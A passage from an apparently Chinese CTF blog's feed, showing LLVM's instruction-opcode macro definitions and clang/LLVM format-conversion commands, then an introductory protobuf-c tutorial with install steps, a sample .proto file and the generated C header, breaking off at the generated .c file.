HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_BINARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_BINARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_CAST_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_CAST_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_USER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_USER_INST(num, opc, Class) HANDLE_OTHER_INST(num, opc, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Terminator Instructions - These instructions are used to terminate a basic</span></span><br><span class="line"><span class="comment">// block of the program.   Every basic block must end with one of these</span></span><br><span class="line"><span class="comment">// instructions for it to be a well formed basic block.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"> FIRST_TERM_INST  ( <span class="number">1</span>)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">1</span>, Ret           , ReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">2</span>, Br            , BranchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">3</span>, Switch        , SwitchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">4</span>, IndirectBr    , IndirectBrInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">5</span>, Invoke        , InvokeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">6</span>, Resume        , ResumeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">7</span>, Unreachable   , UnreachableInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">8</span>, CleanupRet    , CleanupReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">9</span>, CatchRet      , CatchReturnInst)</span><br><span class="line">HANDLE_TERM_INST  (<span class="number">10</span>, CatchSwitch   , CatchSwitchInst)</span><br><span class="line">  LAST_TERM_INST  (<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard unary operators...</span></span><br><span class="line"> FIRST_UNARY_INST(<span class="number">11</span>)</span><br><span class="line">HANDLE_UNARY_INST(<span class="number">11</span>, FNeg  , UnaryOperator)</span><br><span class="line">  LAST_UNARY_INST(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard binary operators...</span></span><br><span class="line"> FIRST_BINARY_INST(<span class="number">12</span>)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">12</span>, Add  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">13</span>, FAdd , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">14</span>, Sub  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">15</span>, FSub , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">16</span>, Mul  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">17</span>, FMul , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">18</span>, UDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">19</span>, SDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">20</span>, FDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">21</span>, URem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">22</span>, SRem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">23</span>, FRem , BinaryOperator)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logical operators (integer operands)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">24</span>, Shl  , BinaryOperator) <span class="comment">// Shift left  (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">25</span>, LShr , BinaryOperator) <span class="comment">// Shift right (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">26</span>, AShr , BinaryOperator) <span class="comment">// Shift right (arithmetic)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">27</span>, And  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">28</span>, Or   , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">29</span>, Xor  , BinaryOperator)</span><br><span class="line">  LAST_BINARY_INST(<span class="number">29</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory operators...</span></span><br><span class="line"> FIRST_MEMORY_INST(<span class="number">30</span>)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">30</span>, Alloca, AllocaInst)  <span class="comment">// Stack management</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">31</span>, Load  , LoadInst  )  <span class="comment">// Memory manipulation instrs</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">32</span>, Store , StoreInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">33</span>, GetElementPtr, GetElementPtrInst)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">34</span>, Fence , FenceInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">35</span>, AtomicCmpXchg , AtomicCmpXchgInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">36</span>, AtomicRMW , AtomicRMWInst )</span><br><span class="line">  LAST_MEMORY_INST(<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cast operators ...</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> The order matters here because CastInst::isEliminableCastPair</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> (see Instructions.cpp) encodes a table based on this ordering.</span></span><br><span class="line"> FIRST_CAST_INST(<span class="number">37</span>)</span><br><span class="line">HANDLE_CAST_INST(<span class="number">37</span>, Trunc   , TruncInst   )  <span class="comment">// Truncate integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">38</span>, ZExt    , ZExtInst    )  <span class="comment">// Zero extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">39</span>, SExt    , SExtInst    )  <span class="comment">// Sign extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">40</span>, FPToUI  , FPToUIInst  )  <span class="comment">// floating point -&gt; UInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">41</span>, FPToSI  , FPToSIInst  )  <span class="comment">// floating point -&gt; SInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">42</span>, UIToFP  , UIToFPInst  )  <span class="comment">// UInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">43</span>, SIToFP  , SIToFPInst  )  <span class="comment">// SInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">44</span>, FPTrunc , FPTruncInst )  <span class="comment">// Truncate floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">45</span>, FPExt   , FPExtInst   )  <span class="comment">// Extend floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">46</span>, PtrToInt, PtrToIntInst)  <span class="comment">// Pointer -&gt; Integer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">47</span>, IntToPtr, IntToPtrInst)  <span class="comment">// Integer -&gt; Pointer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">48</span>, BitCast , BitCastInst )  <span class="comment">// Type cast</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">49</span>, AddrSpaceCast, AddrSpaceCastInst)  <span class="comment">// addrspace cast</span></span><br><span class="line">  LAST_CAST_INST(<span class="number">49</span>)</span><br><span class="line"></span><br><span class="line"> FIRST_FUNCLETPAD_INST(<span class="number">50</span>)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">50</span>, CleanupPad, CleanupPadInst)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">51</span>, CatchPad  , CatchPadInst)</span><br><span class="line">  LAST_FUNCLETPAD_INST(<span class="number">51</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Other operators...</span></span><br><span class="line"> FIRST_OTHER_INST(<span class="number">52</span>)</span><br><span class="line">HANDLE_OTHER_INST(<span class="number">52</span>, ICmp   , ICmpInst   )  <span class="comment">// Integer comparison instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">53</span>, FCmp   , FCmpInst   )  <span class="comment">// Floating point comparison instr.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">54</span>, PHI    , PHINode    )  <span class="comment">// PHI node instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">55</span>, Call   , CallInst   )  <span class="comment">// Call a function</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">56</span>, Select , SelectInst )  <span class="comment">// select instruction</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">57</span>, UserOp1, Instruction)  <span class="comment">// May be used internally in a pass</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">58</span>, UserOp2, Instruction)  <span class="comment">// Internal to passes only</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">59</span>, VAArg  , VAArgInst  )  <span class="comment">// vaarg instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">60</span>, ExtractElement, ExtractElementInst)<span class="comment">// extract from vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">61</span>, InsertElement, InsertElementInst)  <span class="comment">// insert into vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">62</span>, ShuffleVector, ShuffleVectorInst)  <span class="comment">// shuffle two vectors.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">63</span>, ExtractValue, ExtractValueInst)<span class="comment">// extract from aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">64</span>, InsertValue, InsertValueInst)  <span class="comment">// insert into aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">65</span>, LandingPad, LandingPadInst)  <span class="comment">// Landing pad instruction.</span></span><br><span class="line">  LAST_OTHER_INST(<span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_TERM_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_UNARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_BINARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_MEMORY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_CAST_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_FUNCLETPAD_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_OTHER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_USER_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><h2 id="格式转化"><a href="#格式转化" class="headerlink" title="格式转化"></a>格式转化</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.c -&gt; .ll：clang -emit-llvm -S a.c -o a.ll</span><br><span class="line">.c -&gt; .bc: clang -emit-llvm -c a.c -o a.bc</span><br><span class="line">.ll -&gt; .bc: llvm-as a.ll -o a.bc</span><br><span class="line">.bc -&gt; .ll: llvm-dis a.bc -o a.ll</span><br><span class="line">.bc -&gt; .s: llc a.bc -o a.s</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">哈人</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="llvm-pass" scheme="https://ixout.github.io/tags/llvm-pass/"/>
    
  </entry>
  
  <entry>
    <title>protobuf初识</title>
    <link href="https://ixout.github.io/posts/46596/"/>
    <id>https://ixout.github.io/posts/46596/</id>
    <published>2024-04-11T15:24:20.000Z</published>
    <updated>2024-06-24T11:11:32.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h1><p>Protobuf (Protocol Buffers) 是谷歌开发的一款无关平台，无关语言，可扩展，轻量级高效的<strong>序列化结构的数据格式</strong>，用于将自定义数据结构序列化成字节流，和将字节流反序列化为数据结构。</p><p>所以很适合做数据存储和为不同语言，不同应用之间互相通信的数据交换格式，只要实现相同的协议格式，即后缀为proto文件被编译成不同的语言版本，加入各自的项目中，这样不同的语言可以解析其它语言通过Protobuf序列化的数据。目前官方提供c++，java，go等语言支持。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>c与python接口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install protobuf</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/protobuf-c/protobuf-c.git</span><br><span class="line">sudo apt install autoconf, automake, libtool,libprotobuf-dev,libprotoc-dev,protobuf-compiler</span><br><span class="line">./autogen.sh </span><br><span class="line">./configure --prefix=/usr/local/protobuf-c --libdir=/usr/lib </span><br><span class="line">make -j8 &amp;&amp; make install</span><br><span class="line">sudo <span class="built_in">cp</span> -r /usr/local/protobuf-c/include/protobuf-c /usr/include</span><br><span class="line">sudo <span class="built_in">ln</span> -s /usr/local/protobuf-c/bin/protoc-gen-c /usr/local/bin/protoc-c</span><br></pre></td></tr></table></figure><p><code>protobuf-c</code>是protobuf的非官方c实现编译器</p><p>python安装的则是protobuf的官方库,官方库还有自带的<code>protoc(proobuf compiler)</code></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>写个例子尝试一下</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msg.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行</p><p><code>protoc-c --c_out=. msg.proto</code></p><p>可以看到生成了两个文件</p><p><code>msg.pb-c.c</code>与<code>msg.pb-c.h</code></p><p>后者文件中声明了许多结构体与函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: msg.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PROTOBUF_C_msg_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTOBUF_C_msg_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> 1005000 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Person</span> <span class="title">Person</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="type">int32_t</span> id;</span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="type">char</span> *email;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PERSON__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;person__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, NULL, NULL &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Person methods */</span></span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__init</span></span><br><span class="line">                     <span class="params">(Person         *message)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__get_packed_size</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message,</span></span><br><span class="line"><span class="params">                      <span class="type">uint8_t</span>             *out)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">person__pack_to_buffer</span></span><br><span class="line">                     <span class="params">(<span class="type">const</span> Person   *message,</span></span><br><span class="line"><span class="params">                      ProtobufCBuffer     *buffer)</span>;</span><br><span class="line">Person *</span><br><span class="line">       <span class="title function_">person__unpack</span></span><br><span class="line">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span><br><span class="line"><span class="params">                      <span class="type">size_t</span>               len,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span>       *data)</span>;</span><br><span class="line"><span class="type">void</span>   <span class="title function_">person__free_unpacked</span></span><br><span class="line">                     <span class="params">(Person *message,</span></span><br><span class="line"><span class="params">                      ProtobufCAllocator *allocator)</span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*Person_Closure)</span></span><br><span class="line">                 <span class="params">(<span class="type">const</span> Person *message,</span></span><br><span class="line"><span class="params">                  <span class="type">void</span> *closure_data)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> ProtobufCMessageDescriptor person__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  <span class="comment">/* PROTOBUF_C_msg_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>然后便是.c文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 